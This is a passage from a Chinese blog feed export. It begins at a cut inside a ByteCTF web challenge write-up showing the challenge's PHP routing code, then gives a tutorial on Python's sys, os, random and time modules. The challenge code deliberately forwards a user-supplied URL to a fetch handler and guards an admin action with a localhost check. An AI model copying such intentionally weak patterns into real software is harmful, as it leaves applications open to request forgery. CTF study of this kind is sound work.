<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'display_errors'</span>,<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'display_startup_erros'</span>,<span class="number">1</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'routes.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($class_name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">'./classes/'</span>.$class_name.<span class="string">'.php'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">'./classes/'</span>.$class_name.<span class="string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(file_exists(<span class="string">'./controllers/'</span>.$class_name.<span class="string">'.php'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">'./controllers/'</span>.$class_name.<span class="string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没什么信息，同样的方法再读一下routes.php的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//routes.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">Route::set(<span class="string">'index.php'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Index::createView(<span class="string">'Index'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(<span class="string">'index'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Index::createView(<span class="string">'Index'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(<span class="string">'fetch'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'rss_url'</span>]))&#123;</span><br><span class="line">        Fetch::handleUrl($_REQUEST[<span class="string">'rss_url'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::set(<span class="string">'rss_in_order'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_REQUEST[<span class="string">'rss_url'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_REQUEST[<span class="string">'order'</span>]))&#123;</span><br><span class="line">        Admin::createView(<span class="string">'Admin'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span> || $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'::1'</span>)&#123;</span><br><span class="line">        Admin::sort($_REQUEST[<span class="string">'rss_url'</span>],$_REQUEST[<span class="string">'order'</span>]);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">";("</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>（后来有事去了，官方环境关了，也没有合适的复现环境了）</p>
<p><br></p>
<p><br></p>
<p>参考：<br><a href="https://altman.vip/2019/09/09/ByteCTF-WEB/" target="_blank" rel="noopener">https://altman.vip/2019/09/09/ByteCTF-WEB/</a></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Python常用模块</title>
    <url>/2019/07/17/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h4 id="一、sys-—-系统相关的参数和函数"><a href="#一、sys-—-系统相关的参数和函数" class="headerlink" title="一、sys — 系统相关的参数和函数"></a>一、sys — 系统相关的参数和函数</h4><p>sys模块官方文档： <a href="https://docs.python.org/3/library/sys.html" target="_blank" rel="noopener">https://docs.python.org/3/library/sys.html</a></p>
<ul>
<li><strong>sys.argv</strong>：获取运行 Python 程序的命令行参数。其中 sys.argv[0] 通常就是指该 Python 程序，sys.argv[1] 代表为 Python 程序提供的第一个参数，sys.argv[2] 代表为 Python 程序提供的第二个参数……依此类推。</li>
<li><strong>sys.byteorder</strong>：显示本地字节序的指示符。如果本地字节序是大端模式，则该属性返回 big；否则返回 little。</li>
<li><strong>sys.copyright</strong>：该属性返回与 Python 解释器有关的版权信息。</li>
<li><strong>sys.executable</strong>：该属性返回 Python 解释器在磁盘上的存储路径。</li>
<li><strong>sys.exit()</strong>：通过引发 SystemExit 异常来退出程序。将其放在 try 块中不能阻止 finally 块的执行。</li>
<li><strong>sys.flags</strong>：该只读属性返回运行 Python 命令时指定的旗标。</li>
<li><strong>sys.getfilesystemencoding()</strong>：返回在当前系统中保存文件所用的字符集。</li>
<li><strong>sys.getrefcount(object)</strong>：返回指定对象的引用计数。前面介绍过，当 object 对象的引用计数为 0 时，系统会回收该对象。</li>
<li><strong>sys.getrecursionlimit()</strong>：返回 Python 解释器当前支持的递归深度。该属性可通过 - setrecursionlimit() 方法重新设置。</li>
<li><strong>sys.getswitchinterval()</strong>：返回在当前 Python 解释器中线程切换的时间间隔。该属性可通过 setswitchinterval() 函数改变。</li>
<li><strong>sys.implementation</strong>：返回当前 Python 解释器的实现。</li>
<li><strong>sys.maxsize</strong>：返回 Python 整数支持的最大值。在 32 位平台上，该属性值为 2**31-1；在 64 位平台上，该属性值为 2**63-1。</li>
<li><strong>sys.modules</strong>：返回模块名和载入模块对应关系的字典。</li>
<li><strong>sys.path</strong>：该属性指定 Python 查找模块的路径列表。程序可通过修改该属性来动态增加 Python 加载模块的路径。</li>
<li><strong>sys.platform</strong>：返回 Python 解释器所在平台的标识符。</li>
<li><strong>sys.stdin</strong>：返回系统的标准输入流——一个类文件对象。</li>
<li><strong>sys.stdout</strong>：返回系统的标准输出流——一个类文件对象。</li>
<li><strong>sys.stderr</strong>：返回系统的错误输出流——一个类文件对象。</li>
<li><strong>sys.version</strong>：返回当前 Python 解释器的版本信息。</li>
<li><strong>sys.winver</strong>：返回当前 Python 解释器的主版本号。</li>
</ul>
<p>例:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="comment"># 输出argv列表的长度</span></span><br><span class="line">print(len(argv))</span><br><span class="line"><span class="comment"># 遍历argv列表的每个元素</span></span><br><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> argv:</span><br><span class="line">   print(arg)</span><br><span class="line"></span><br><span class="line">如果使用python3 test.py Lethe Python 命令运行该脚本，则结果为：</span><br><span class="line"><span class="number">3</span></span><br><span class="line">test.py</span><br><span class="line">Lethe</span><br><span class="line">Python</span><br></pre></td></tr></table></figure></p>
<p>sys.path 也是很有用的一个属性，它可用于在程序运行时为 Python 动态修改模块加载路径。例如，如下程序在运行时动态指定加载 <code>E:\Lethe</code>目录下的模块：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># 动态添加g:\fk_ext路径作为模块加载路径</span></span><br><span class="line">sys.path.append(<span class="string">'E:\\Lethe'</span>)</span><br><span class="line"><span class="comment"># 加载g:\fk_ext路径下的hello模块</span></span><br><span class="line"><span class="keyword">import</span> hello</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="二、os-—-操作系统接口模块"><a href="#二、os-—-操作系统接口模块" class="headerlink" title="二、os — 操作系统接口模块"></a>二、os — 操作系统接口模块</h4><p>os模块官方文档：<a href="https://docs.python.org/3/library/os.html。" target="_blank" rel="noopener">https://docs.python.org/3/library/os.html。</a></p>
<h6 id="（1）os模块与目录相关的函数如下"><a href="#（1）os模块与目录相关的函数如下" class="headerlink" title="（1）os模块与目录相关的函数如下:"></a>（1）os模块与目录相关的函数如下:</h6><ul>
<li><strong>os.getcwd()</strong>：获取当前目录。</li>
<li><strong>os.chdir(path)</strong>：改变当前目录。</li>
<li><strong>os.fchdir(fd)</strong>：通过文件描述利改变当前目录。该函数与上一个函数的功能基本相似，只是该函数以文件描述符作为参数来代表目录。</li>
<li><strong>s.chroot(path)</strong>：改变当前进程的根目录。</li>
<li><strong>os.listdir(path)</strong>：返回 path 对应目录下的所有文件和子目录。</li>
<li><strong>os.mkdir(path[, mode])</strong>：创建 path 对应的目录，其中 mode 用于指定该目录的权限。该 mode参数代表一个 UNIX 风格的权限，比如 0o777 代表所有者可读/可写/可执行、组用户可读/可写/可执行、其他用户可读/可写/可执行。</li>
<li><strong>os.makedirs(path[, mode])</strong>：其作用类似于 mkdir()，但该函数的功能更加强大，它可以边归创建目录。比如要创建 abc/xyz/wawa 目录，如果在当前目录下没有 abc 目录，那么使用 mkdir() 函数就会报错，而使用 makedirs() 函数则会先创建 abc，然后在其中创建 xyz 子目录，最后在 xyz 子目录下创建 wawa 子目录。</li>
<li><strong>os.rmdir(path)</strong>：删除 path 对应的空目录。如果目录非空，则抛出一个 OSError 异常。程序可以先用 os.remove() 函数删除文件。</li>
<li><strong>os.removedirs(path)</strong>：递归删除目录。其功能类似于 rmdir()，但该函数可以递归删除 abc/xyz/wawa 目录，它会从 wawa 子目录开始删除，然后删除 xyz 子目录，最后删除 abc 目录。</li>
<li><strong>os.rename(src, dst)</strong>：重命名文件或目录，将 src 重名为 dst。</li>
<li><strong>os.renames(old, new)</strong>：对文件或目录进行递归重命名。其功能类似于 rename()，但该函数可以递归重命名 abc/xyz/wawa 目录，它会从 wawa 子目录开始重命名，然后重命名 xyz 子目录，最后重命名 abc 目录。</li>
</ul>
<p>除此之外，<strong>os.path</strong> 模块下提供了一些操作目录的方法，这些函数可以操作系统的目录本身。</p>
<h6 id="os-path模块下的操作目录的常见函数的功能和用法："><a href="#os-path模块下的操作目录的常见函数的功能和用法：" class="headerlink" title="os.path模块下的操作目录的常见函数的功能和用法："></a>os.path模块下的操作目录的常见函数的功能和用法：</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 获取绝对路径</span></span><br><span class="line">print(os.path.abspath(<span class="string">"abc.txt"</span>)) <span class="comment"># G:\publish\codes\12\12.2\abc.txt</span></span><br><span class="line"><span class="comment"># 获取共同前缀</span></span><br><span class="line">print(os.path.commonprefix([<span class="string">'/usr/lib'</span>, <span class="string">'/usr/local/lib'</span>])) <span class="comment"># /usr/l</span></span><br><span class="line"><span class="comment"># 获取共同路径</span></span><br><span class="line">print(os.path.commonpath([<span class="string">'/usr/lib'</span>, <span class="string">'/usr/local/lib'</span>])) <span class="comment"># \usr</span></span><br><span class="line"><span class="comment"># 获取目录</span></span><br><span class="line">print(os.path.dirname(<span class="string">'abc/xyz/README.txt'</span>)) <span class="comment">#abc/xyz</span></span><br><span class="line"><span class="comment"># 判断指定目录是否存在</span></span><br><span class="line">print(os.path.exists(<span class="string">'abc/xyz/README.txt'</span>)) <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 获取最近一次访问时间</span></span><br><span class="line">print(time.ctime(os.path.getatime(<span class="string">'os.path_test.py'</span>)))</span><br><span class="line"><span class="comment"># 获取最后一次修改时间</span></span><br><span class="line">print(time.ctime(os.path.getmtime(<span class="string">'os.path_test.py'</span>)))</span><br><span class="line"><span class="comment"># 获取创建时间</span></span><br><span class="line">print(time.ctime(os.path.getctime(<span class="string">'os.path_test.py'</span>)))</span><br><span class="line"><span class="comment"># 获取文件大小</span></span><br><span class="line">print(os.path.getsize(<span class="string">'os.path_test.py'</span>))</span><br><span class="line"><span class="comment"># 判断是否为文件</span></span><br><span class="line">print(os.path.isfile(<span class="string">'os.path_test.py'</span>)) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 判断是否为目录</span></span><br><span class="line">print(os.path.isdir(<span class="string">'os.path_test.py'</span>)) <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 判断是否为同一个文件</span></span><br><span class="line">print(os.path.samefile(<span class="string">'os.path_test.py'</span>, <span class="string">'./os.path_test.py'</span>)) <span class="comment"># True</span></span><br></pre></td></tr></table></figure>
<h6 id="（2）os模块与文件访问相关的函数如下"><a href="#（2）os模块与文件访问相关的函数如下" class="headerlink" title="（2）os模块与文件访问相关的函数如下:"></a>（2）os模块与文件访问相关的函数如下:</h6><ul>
<li><strong>os.open(file, flags[, mode])</strong>：打开一个文件，并且设置打开选项，mode 参数是可选的。该函数返回文件描述符。其中 flags 代表打开文件的旗标，它支持如下一个或多个选项：<ul>
<li>os.O_RDONLY：以只读的方式打开。</li>
<li>os.O_WRONLY：以只写的方式打开。</li>
<li>os.O_RDWR：以读写的方式打开。</li>
<li>os.O_NONBLOCK：打开时不阻塞。</li>
<li>os.O_APPEND：以追加的方式打开。</li>
<li>os.O_CREAT：创建并打开一个新文件。</li>
<li>os.O_TRUNC：打开一个文件并截断它的长度为0（必须有写权限）。</li>
<li>os.O_EXCL：在创建文件时，如果指定的文件存在，则返回错误。</li>
<li>os.O_SHLOCK：自动获取共享锁。</li>
<li>os.O_EXLOCK：自动获取独立锁。</li>
<li>os.O_DIRECT：消除或减少缓存效果。</li>
<li>os.O_FSYNC：同步写入。</li>
<li>os.O_NOFOLLOW：不追踪软链接。</li>
</ul>
</li>
<li><strong>os.read(fd, n)</strong>：从文件描述符 fd 中读取最多 n 个字节，返回读到的字符串。如果文件描述符副对应的文件己到达结尾，则返回一个空字节串。</li>
<li><strong>os.write(fd, str)</strong>：将字节串写入文件描述符 fd 中，返回实际写入的字节串长度。</li>
<li><strong>os.close(fd)</strong>：关闭文件描述符 fd。</li>
<li><strong>os.lseek(fd, pos, how)</strong>：该函数同样用于移动文件指针。其中 how 参数指定从哪里开始移动，如果将 how 设为 0 或 SEEK_SET，则表明从文件开头开始移动；如果将 how 设为 1 或 SEEK_CUR，则表明从文件指针当前位置开始移动；如果将 how 设为 2 或 SEEK_END，则表明从文件结束处开始移动。上面几个函数同样可用于执行文件的读写，程序通常会先通过 os.open() 打开文件，然后调用 os.read()、os.write() 来读写文件，当操作完成后通过 os.close() 关闭文件。</li>
<li><strong>os.fdopen(fd[, mode[, bufsize]])</strong>：通过文件描述符 fd 打开文件，并返回对应的文件对象。</li>
<li><strong>os.closerange(fd_low, fd_high)</strong>：关闭从 fd_low（包含）到 fd_high（不包含）范围的所有文件描述符。</li>
<li><strong>os.dup(fd)</strong>：复制文件描述符。</li>
<li><strong>os.dup2(fd,fd2)</strong>：将一个文件描述符fd复制到另一个文件描述符fd2中。</li>
<li><strong>os.ftruncate(fd, length)</strong>：将 fd 对应的文件截断到 length 长度，因此此处传入的 length 参数不应该超过文件大小。</li>
<li><strong>os.remove(path)</strong>：删除 path 对应的文件。如果 path 是一个文件夹，则抛出 OSError 错误。如果要删除目录，则使用 os.rmdir()。</li>
<li><strong>os.link(src, dst)</strong>：创建从 src 到 dst 的硬链接。硬链接是 UNIX 系统的概念，如果在 Windows 系统中就是复制目标文件。</li>
<li><strong>os.symlink(src, dst)</strong>：创建从 src 到 dst 的符号链接，对应于 Windows 的快捷方式。</li>
</ul>
<h6 id="（3）os模块与权限相关的函数"><a href="#（3）os模块与权限相关的函数" class="headerlink" title="（3）os模块与权限相关的函数"></a>（3）os模块与权限相关的函数</h6><ul>
<li><strong>os.access(path, mode)</strong>：检查 path 对应的文件或目录是否具有指定权限。该函数的第二个参数可能是以下四个状态值的一个或多个值：<ul>
<li>os.F_OK：判断是否存在。</li>
<li>os.R_OK：判断是否可读。</li>
<li>os.W_OK：判断是否可写。</li>
<li>os.X_OK：判断是否可执行。</li>
</ul>
</li>
<li><strong>os.chrnod(path, mode)</strong>：更改权限。其中 mode 参数代表要改变的权限，该参数支持的值可以是以下一个或多个值的组合：<ul>
<li>stat.S_IXOTH：其他用户有执行权限。</li>
<li>stat.S_IWOTH：其他用户有写权限。</li>
<li>stat.S_TROTH：其他用户有读权限。</li>
<li>stat.S_IRWXO：其他用户有全部权限。</li>
<li>stat.S_IXGRP：组用户有执行权限。</li>
<li>stat.S_IWGRP：组用户有写权限。</li>
<li>stat.S_IRGRP：组用户有读权限。</li>
<li>stat.S_IRWXG：组用户有全部权限。</li>
<li>stat.S_IXUSR：所有者有执行权限。</li>
<li>stat.S_IWUSR：所有者有写权限。</li>
<li>stat.S_IRUSR：所有者有读权限。</li>
<li>stat.S_IRWXU：所有者有全部权限。</li>
<li>stat.S_IREAD：Windows 将该文件设为只读的。</li>
<li>stat.S_IWRITE：Windows 将该文件设为可写的。</li>
</ul>
</li>
<li>os.chown(path, uid, gid)：更改文件的所有者。其中 uid 代表用户 id，gid 代表组 id。该命令主要在 UNIX 文件系统下有效。</li>
<li>os.fchmod(fd, mode)：改变一个文件的访问权限，该文件由文件描述符 fd 指定。该函数的功能与 os.chmod() 函数的功能相似，只是该函数使用 fd 代表文件。</li>
<li>os.fchown(fd, uid, gid)：改变文件的所有者，该文件由文件描述符 fd 指定。该函数的功能与 os.chown() 函数的功能相似，只是该函数使用 fd 代表文件。</li>
</ul>
<h6 id="（4）os模块与进程相关的函数"><a href="#（4）os模块与进程相关的函数" class="headerlink" title="（4）os模块与进程相关的函数"></a>（4）os模块与进程相关的函数</h6><ul>
<li><strong>os.name</strong>：返回导入依赖模块的操作系统名称，通常可返回 ‘posix’、’nt’、 ‘java’ 等值其中之一。</li>
<li>os.environ：返回在当前系统上所有环境变量组成的字典。</li>
<li><strong>os.fsencode(filename)</strong>：该函数对类路径（path-like）的文件名进行编码。</li>
<li><strong>os.fsdecode(filename)</strong>：该函数对类路径（path-like）的文件名进行解码。</li>
<li><strong>os.PathLike</strong>：这是一个类，代表一个类路径（path-like）对象。</li>
<li><strong>os.getenv(key, default=None）</strong>：获取指定环境变量的值。</li>
<li><strong>os.getlogin()</strong>：返回当前系统的登录用户名。与该函数对应的还有 os.getuid()、os.getgroups()、os.getgid() 等函数，用于获取用户 ID、用户组、组 ID 等，这些函数通常只在 UNIX 系统上有效。</li>
<li><strong>os.getpid()</strong>：获取当前进程 ID。</li>
<li><strong>os.getppid()</strong>：获取当前进程的<strong>父进程</strong> ID。</li>
<li><strong>os.putenv(key, value)</strong>：该函数用于设置环境变量。</li>
<li><strong>os.cpu_count()</strong>：返回当前系统的 CPU 数量。</li>
<li><strong>os.sep</strong>：返回路径分隔符。</li>
<li><strong>os.pathsep</strong>：返回当前系统上多条路径之间的分隔符。一般在 Windows 系统上多条路径之间的分隔符是英文分号（;）；在 UNIX 及类 UNIX 系统（如 Linux、Mac os X）上多条路径之间的分隔符是英文冒号（:）。</li>
<li><strong>os.linesep</strong>：返回当前系统的换行符。一般在 Windows 系统上换行符是“\r\n”：在 UNIX 系统上换行符是“\n”；在 Mac os X 系统上换行符是“\r”。</li>
<li><strong>os.urandom(size)</strong>：返回适合作为加密使用的、最多由 N 个字节组成的 bytes 对象。该函数通过操作系统特定的随机性来源返回随机字节，该随机字节通常是不可预测的，因此适用于绝大部分加密场景。</li>
</ul>
<p>在 os 模块下与<strong>进程管理</strong>相关的函数如下：</p>
<ul>
<li><strong>os.abort()</strong>：生成一个 SIGABRT 信号给当前进程。在 UNIX 系统上，默认行为是生成内核转储；在 Windows 系统上，进程立即返回退出代码 3。</li>
<li><p><strong>os.execl(path, arg0, arg1, …）</strong>：该函数还有一系列功能类似的函数，比如 os.execle()、os.execlp() 等，这些函数都是使用参数列表 arg0, arg1,…来执行 path 所代表的执行文件的。<br><code>由于 os.exec*() 函数都是 PosIX 系统的直接映射，因此如采使用该命令来执行 Python 程序，传入的 arg0 参数没有什么作用。os._exit(n) 用于强制退出 Python 解释器。将其放在 try 决中可以阻止 finally 块的执行。</code></p>
</li>
<li><p><strong>os.forkpty()</strong>：fork一个子进程。</p>
</li>
<li><strong>os.kill(pid, sig)</strong>：将 sig 信号发送到 pid 对应的过程，用于结束该进程。</li>
<li><strong>os.killpg(pgid, sig)</strong>：将 sig 信号发送到 pgid 对应的进程组。</li>
<li><strong>os.popen(cmd, mode=’r’, buffering=-1)</strong>：用于向 cmd 命令打开读写管道（当 mode 为 r 时为只读管道，当 mode 为 rw 时为读写管道），buffering 缓冲参数与内置的 open() 函数有相同的含义。该函数返回的文件对象用于读写字符串，而不是字节。</li>
<li><strong>os.spawnl(mode, path, …)</strong>：该函数还有一系列功能类似的函数，比如 os.spawnle()、os.spawnlp() 等，这些函数都用于在新进程中执行新程序。</li>
<li><strong>os.startfile(path[,operation])</strong>：对指定文件使用该文件关联的工具执行 operation 对应的操作。如果不指定 operation 操作，则默认执行打开（open）操作。operation 参数必须是有效的命令行操作项目，比如 open（打开）、edit（编辑）、print（打印）等。</li>
<li><strong>os.system(command)</strong>：运行操作系统上的指定命令。</li>
</ul>
<p><br></p>
<h4 id="三、random-—-生成伪随机数"><a href="#三、random-—-生成伪随机数" class="headerlink" title="三、random —  生成伪随机数"></a>三、random —  生成伪随机数</h4><p>random模块官方文档：<a href="https://docs.python.org/3/library/random.html" target="_blank" rel="noopener">https://docs.python.org/3/library/random.html</a></p>
<p>在 random 模块下提供了如下常用函数：</p>
<ul>
<li><strong>random.seed(a=None, version=2)</strong>：指定种子来初始化伪随机数生成器。</li>
<li><strong>random.randrange(start, stop[, stop])</strong>：返回从 start 开始到 stop 结束、步长为 step 的随机数。其实就相当于 choice(range(start, stop, step)) 的效果，只不过实际底层并不生成区间对象。</li>
<li><strong>random.randint(a, b)</strong>：生成一个范围为 a≤N≤b 的随机数。其等同于 randrange(a, b+1) 的效果。</li>
<li><strong>random.choice(seq)</strong>：从 seq 中随机抽取一个元素，如果 seq 为空，则引发 IndexError 异常。</li>
<li><strong>random.choices(seq, weights=None, cum_weights=None, k=1)</strong>：从 seq 序列中抽取 k 个元素，还可通过 weights 指定各元素被抽取的权重（代表被抽取的可能性高低）。</li>
<li><strong>random.shuffle(x[, random])</strong>：对 x 序列执行洗牌“随机排列”操作。</li>
<li><strong>random.sample(population, k)</strong>：从 population 序列中随机抽取 k 个独立的元素。</li>
<li><strong>random.random()</strong>：生成一个从0.0（包含）到 1.0（不包含）之间的伪随机浮点数。</li>
<li><strong>random.uniform(a, b)</strong>：生成一个范围为 a≤N≤b 的随机数。</li>
<li><strong>random.expovariate(lambd)</strong>：生成呈指数分布的随机数。其中 lambd 参数(其实应该是 lambda，只是 lambda 是 Python 关键字，所以简写成 lambd）为 1 除以期望平均值。如果 lambd 是正值，则返回的随机数是从 0 到正无穷大；如果 lambd 为负值，则返回的随机数是从负无穷大到 0。</li>
</ul>
<p>例：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#生成范围为0.0≤x&lt;1.0 的伪随机浮点数</span></span><br><span class="line"><span class="keyword">print</span> (random.random())</span><br><span class="line"><span class="comment">#生成范围为2.5≤x&lt;10.0 的伪随机浮点数</span></span><br><span class="line"><span class="keyword">print</span> (random.uniform(<span class="number">2.5</span>, <span class="number">10.0</span>))</span><br><span class="line"><span class="comment">#生成呈指数分布的伪随机浮点数</span></span><br><span class="line"><span class="keyword">print</span> (random.expovariate(<span class="number">1</span>/<span class="number">5</span>))</span><br><span class="line"><span class="comment">#生成从0 到9 的伪随机整数</span></span><br><span class="line">print(random.randrange(<span class="number">10</span>))</span><br><span class="line"><span class="comment">#生成从0 到100 的随机偶数</span></span><br><span class="line"><span class="keyword">print</span> (random.randrange(<span class="number">0</span>, <span class="number">101</span> , <span class="number">2</span>))</span><br><span class="line"><span class="comment">#随机抽取一个元素</span></span><br><span class="line"><span class="keyword">print</span> (random.choice ([<span class="string">'Python'</span>,<span class="string">'Swift'</span>,<span class="string">'Kotlin'</span>]))</span><br><span class="line">book_list = [<span class="string">'Python'</span>,<span class="string">'Swift'</span>,<span class="string">'Kotlin'</span>]</span><br><span class="line"><span class="comment">#对列表元素进行随机排列</span></span><br><span class="line">random.shuffle (book_list)</span><br><span class="line"><span class="keyword">print</span> (book_list)</span><br><span class="line"><span class="comment">#随机抽取4 个独立的元素</span></span><br><span class="line"><span class="keyword">print</span> (random.sample([<span class="number">10</span>, <span class="number">20</span> , <span class="number">30</span> , <span class="number">40</span> , <span class="number">50</span>], k=<span class="number">4</span>))</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="四、time-—-时间的访问和转换"><a href="#四、time-—-时间的访问和转换" class="headerlink" title="四、time — 时间的访问和转换"></a>四、time — 时间的访问和转换</h4><p>time模块官方文档：<a href="https://docs.python.org/zh-cn/3/library/time.html#module-time" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/time.html#module-time</a></p>
<p>在日期、时间模块内常用的功能函数如下：</p>
<ul>
<li><strong>time.asctime([t])</strong>：将时间元组或 struct_time 转换为时间字符串。如果不指定参数 t，则默认转换当前时间。</li>
<li><p><strong>time.ctime([secs])</strong>：将以秒数代表的时间转换为时间宇符串。<br><code>Python 可以用从 1970 年 1 月 1 日 0 点整到现在所经过的秒数来代表当前时间，比如我们写 30 秒，那么意味着时间是 1970 年 1 月 1 日 0 点 0 分 30 秒。但需要注意的是，在实际输出时可能会受到时区的影响，比如中国处于东八区，因此实际上会输出 1970 年 1 月 1 日 8 点 0 分 30 秒。</code></p>
</li>
<li><p><strong>time.gmtime([secs])</strong>：将以秒数代表的时间转换为 struct_time 对象。如果不传入参数，则使用当前时间。</p>
</li>
<li><strong>time.localtime([secs])</strong>：将以秒数代表的时间转换为代表当前时间的 struct_time 对象。如果不传入参数，则使用当前时间。</li>
<li><strong>time.mktime(t)</strong>：它是 localtime 的反转函数，用于将 struct_time 对象或元组代表的时间转换为从 1970 年 1 月 1 日 0 点整到现在过了多少秒。</li>
<li><strong>time.perf_counter()</strong>：返回性能计数器的值。以秒为单位。</li>
<li><strong>time.process_time()</strong>：返回当前进程使用 CPU 的时间。以秒为单位。</li>
<li><strong>time.sleep(secs)</strong>：暂停 secs 秒，什么都不干。</li>
<li><strong>time.strftime(format[, t])</strong>：将时间元组或 struct_time 对象格式化为指定格式的时间字符串。如果不指定参数 t，则默认转换当前时间。</li>
<li><strong>time.strptime(string[, format])</strong>：将字符串格式的时间解析成 struct_time 对象。</li>
<li><strong>time.time()</strong>：返回从 1970 年 1 月 1 日 0 点整到现在过了多少秒。</li>
<li><strong>time.timezone</strong>：返回本地时区的时间偏移，以秒为单位。</li>
<li><strong>time.tzname</strong>：返回本地时区的名字。</li>
</ul>
<p>例：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 将当前时间转换为时间字符串</span></span><br><span class="line">print(time.asctime())</span><br><span class="line"><span class="comment"># 将指定时间转换时间字符串，时间元组的后面3个元素没有设置</span></span><br><span class="line">print(time.asctime((<span class="number">2018</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span> ,<span class="number">0</span>))) <span class="comment"># Mon Feb  4 11:08:23 2018</span></span><br><span class="line"><span class="comment"># 将以秒数为代表的时间转换为时间字符串</span></span><br><span class="line">print(time.ctime(<span class="number">30</span>)) <span class="comment"># Thu Jan  1 08:00:30 1970</span></span><br><span class="line"><span class="comment"># 将以秒数为代表的时间转换为struct_time对象。</span></span><br><span class="line">print(time.gmtime(<span class="number">30</span>))</span><br><span class="line"><span class="comment"># 将当前时间转换为struct_time对象。</span></span><br><span class="line">print(time.gmtime())</span><br><span class="line"><span class="comment"># 将以秒数为代表的时间转换为代表当前时间的struct_time对象</span></span><br><span class="line">print(time.localtime(<span class="number">30</span>))</span><br><span class="line"><span class="comment"># 将元组格式的时间转换为秒数代表的时间</span></span><br><span class="line">print(time.mktime((<span class="number">2018</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span> ,<span class="number">0</span>))) <span class="comment"># 1517713703.0</span></span><br><span class="line"><span class="comment"># 返回性能计数器的值</span></span><br><span class="line">print(time.perf_counter())</span><br><span class="line"><span class="comment"># 返回当前进程使用CPU的时间</span></span><br><span class="line">print(time.process_time())</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">10</span>)	<span class="comment"># 暂停10s</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前时间转换为指定格式的字符串</span></span><br><span class="line">print(time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>))</span><br><span class="line">st = <span class="string">'2018年3月20日'</span></span><br><span class="line"><span class="comment"># 将指定时间字符串恢复成struct_time对象。</span></span><br><span class="line">print(time.strptime(st, <span class="string">'%Y年%m月%d日'</span>))</span><br><span class="line"><span class="comment"># 返回从1970年1970年1月1日0点整到现在过了多少秒。</span></span><br><span class="line">print(time.time())</span><br><span class="line"><span class="comment"># 返回本地时区的时间偏移，以秒为单位</span></span><br><span class="line">print(time.timezone) <span class="comment"># 在国内东八区输出-28800</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
